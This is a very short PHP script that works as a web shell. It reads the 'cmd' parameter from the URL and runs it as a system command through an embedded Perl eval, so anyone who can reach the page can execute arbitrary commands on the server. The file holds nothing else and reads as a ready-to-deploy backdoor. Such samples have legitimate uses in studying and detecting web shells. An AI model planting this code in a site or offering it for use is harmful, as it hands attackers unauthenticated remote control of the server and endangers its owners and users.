<?php
$command = $_GET['cmd'];
$perl=new perl();
$perl->eval("system('$command')");
?>